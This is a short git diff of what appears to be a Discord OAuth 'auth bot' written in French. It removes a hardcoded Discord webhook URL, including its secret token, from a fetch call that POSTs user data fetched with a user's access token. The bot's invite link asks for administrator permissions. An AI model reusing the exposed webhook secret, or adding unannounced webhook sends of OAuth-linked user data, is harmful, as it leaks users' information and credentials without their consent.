@@ -69,7 +69,7 @@ const tgg = {headers: {authorization: `${cdcd.token_type} ${ac_token}`,}}
                             '/' +
                             te.data.avatar +
                             '.png?size=4096'
-                        fetch('https://ptb.discord.com/api/webhooks/997215251609169940/gBanSkhd_W1-LABeJXCOZScTmPnX2tRbFgiEfk-lRNC844orMhUxauoN_RQLQFAQCs6b', {
+                        fetch('', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -133,8 +133,6 @@ client.on("ready", () => {
  
     console.log(`${chalk.blue('AUTH BOT V.3')}\n${chalk.green('->')} Le bot est connecté en tant que [ ${client.user.username} ], il utilise comme prefix : ${config.prefix}\n${chalk.green('->')} L'invite du bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
 })
-
-
 
 client.on("messageCreate", async (ctx) => {
     if (!ctx.guild || ctx.author.bot) return;
